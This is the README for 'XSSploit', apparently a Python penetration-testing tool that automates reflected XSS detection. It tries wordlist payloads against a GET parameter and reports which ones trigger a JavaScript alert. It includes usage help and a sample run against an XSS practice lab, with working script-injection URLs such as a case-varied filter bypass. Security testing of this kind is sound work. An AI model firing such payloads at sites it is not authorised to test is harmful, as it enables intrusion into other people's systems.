# XSSploit
A python3 tool for automating detection of XSS vulnerability and finding appropriate exploits. This tool just tries every XSS payload given in the wordlist against the vulnerable 'GET' parameter and detects if the javascript was executed and reports it as true positive.

## Requirements
Firefox geckdriver is required for selenium to work. 
Install from : [https://github.com/mozilla/geckodriver/releases](https://github.com/mozilla/geckodriver/releases)
```
$ pip install -r requirements.txt
```

## Usage
```
$ python xssploit.py -h
usage: xssploit.py [-h] [-u URL] [-x PAYLOADS] [-p PARAMETER]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL
  -x PAYLOADS, --xss-payloads PAYLOADS
                        XSS payloads wordlist
  -p PARAMETER, --parameter PARAMETER
                        Parameter to test
```

## Example
```
$ python xssploit.py -u "http://leettime.net/xsslab1/chalg1.php?name=hello&submit=Search" -x xss.txt -p name
[+] Input reflection detected
[*] Brute forcing XSS payloads now ...
[*] Testing : http://leettime.net/xsslab1/chalg1.php?name=<script>alert(document.URL);</script>&submit=Search
[+] Alert detected in : http://leettime.net/xsslab1/chalg1.php?name=<script>alert(document.URL);</script>&submit=Search
[*] Testing : http://leettime.net/xsslab1/chalg1.php?name=<ScRipT>alert(document.URL);</ScRipT>&submit=Search
[+] Alert detected in : http://leettime.net/xsslab1/chalg1.php?name=<ScRipT>alert(document.URL);</ScRipT>&submit=Search
[*] Testing : http://leettime.net/xsslab1/chalg1.php?name=<script>alert(document.URL)</script>&submit=Search
[+] Alert detected in : http://leettime.net/xsslab1/chalg1.php?name=<script>alert(document.URL)</script>&submit=Search
[*] Testing : http://leettime.net/xsslab1/chalg1.php?name=hello&submit=Search

Alert detected in the following URLs :

[+] http://leettime.net/xsslab1/chalg1.php?name=<script>alert(document.URL);</script>&submit=Search
[+] http://leettime.net/xsslab1/chalg1.php?name=<ScRipT>alert(document.URL);</ScRipT>&submit=Search
[+] http://leettime.net/xsslab1/chalg1.php?name=<script>alert(document.URL)</script>&submit=Search
```

## Author
* **Goutham** - [G0uth4m](https://github.com/G0uth4m)
